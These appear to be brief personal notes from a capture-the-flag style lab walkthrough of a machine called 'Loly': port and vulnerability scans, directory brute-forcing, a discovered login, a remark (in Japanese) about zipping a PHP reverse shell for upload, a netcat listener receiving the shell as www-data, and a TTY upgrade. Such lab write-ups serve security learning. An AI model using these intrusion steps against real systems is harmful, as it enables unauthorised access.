Service Enumeration

└─# nmap -p- 192.168.133.136

![[Loly image 19.png]]

└─# nmap -sV -sC -p80 192.168.133.136

![[Loly image 20.png]]

└─# nmap -p80 --script vuln 192.168.133.136

![[Loly image 21.png]]

└─# gobuster dir -u  http://192.168.133.136/ -w /usr/share/wordlists/dirb/common.txt

![[Loly image 22.png]]

![[Loly image 23.png]]

\[!\] Valid Combinations Found:

\| Username: loly, Password: fernando

![[Loly image 24.png]]

![[Loly image 25.png]]

アップロードするreverse-shell.phpはzipにしてからでないとエラーになる

┌──(kali㉿kali)-\[~\]

└─$ nc -nlvp 1234

listening on \[any\] 1234 ...

connect to \[192.168.133.99\] from (UNKNOWN) \[192.168.133.136\] 46144

Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

05:04:33 up 14:18,  0 users,  load average: 0.00, 0.00, 0.00

USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off

$

![[Loly image 26.png]]

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@ubuntu:/$

![[Loly image 27.png]]